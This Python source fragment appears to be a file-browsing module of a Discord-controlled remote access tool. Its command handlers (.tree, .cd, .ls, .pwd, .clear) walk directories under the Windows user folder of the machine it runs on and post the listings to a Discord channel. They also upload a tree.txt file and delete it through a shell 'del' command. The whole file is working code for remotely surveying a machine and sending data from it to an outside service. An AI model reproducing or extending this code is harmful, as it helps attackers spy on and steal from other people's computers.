from itertools import islice
from resources.misc import *
from pathlib import Path
import subprocess
import sys
import os
# end of imports


# on reaction add
elif str(reaction) == '🔴' and reaction.message.content[:15] == '```End of tree.':
    for i in tree_messages:
        try: await i.delete()
        except: pass
    tree_messages = []
    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)

elif str(reaction) == '📥' and reaction.message.content[:15] == '```End of tree.':
    await reaction.message.channel.send(file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt'))
    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)

# on message
elif message.content == '.clear':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        async for message in client.get_channel(channel_ids['file']).history():
            await message.delete()
    else:
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

elif message.content == '.tree':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        tree_messages = []
        tree_txt_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + 'tree.txt'
        dir_path = Path('/'.join(working_directory))
        tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
        with open(tree_txt_path, 'w', encoding='utf-8') as system_tree:
            system_tree.write(str(dir_path) + '\n')

        length_limit = sys.maxsize
        iterator = tree(Path('/'.join(working_directory)))

        tree_message_content = '```^\n'
        for line in islice(iterator, length_limit):
            with open(tree_txt_path, 'a+', encoding='utf-8') as system_tree:
                system_tree.write(line + '\n')
            if len(tree_message_content) > 1800:
                tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
                tree_message_content = '```'
            else:
                tree_message_content += str(line) + '\n'
        if tree_message_content != '```':
            tree_messages.append(await message.channel.send(tree_message_content + '```'))
        
        reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
        await reaction_msg.add_reaction('📥')
        await reaction_msg.add_reaction('🔴')
    else:
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

elif message.content[:3] == '.cd':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        if message.content.strip() == '.cd':
            reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
        else:
            if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                if '/' in message.content:
                    for dir in message.content[4:].split('/'):
                        if dir == '..': working_directory.pop(-1)
                        else: working_directory.append(dir)
                else:
                    if message.content[4:] == '..': working_directory.pop(-1)
                    else: working_directory.append(message.content[4:])
                reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
            else:
                reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')

    else:
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

elif message.content == '.ls':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        dir_content_f, dir_content_d, directory_content = [], [], []
        for element in os.listdir('/'.join(working_directory)+'/'):
            if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
            else: dir_content_d.append(element)
        dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
        for single_directory in dir_content_d: directory_content.append(single_directory)
        for single_file in dir_content_f: directory_content.append(single_file)
        await message.channel.send('```Content of ' + '/'.join(working_directory) +'/ at ' + current_time() + '```')
        lsoutput = directory_content
        while lsoutput != []:
            if len('\n'.join(lsoutput)) > 1994:
                temp = ''
                while len(temp+lsoutput[0])+1 < 1994:
                    temp += lsoutput[0] + '\n'
                    lsoutput.pop(0)
                await message.channel.send('```' + temp + '```')
            else:
                await message.channel.send('```' + '\n'.join(lsoutput) + '```')
                lsoutput = []
    else:
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')

elif message.content == '.pwd':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
    else:
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
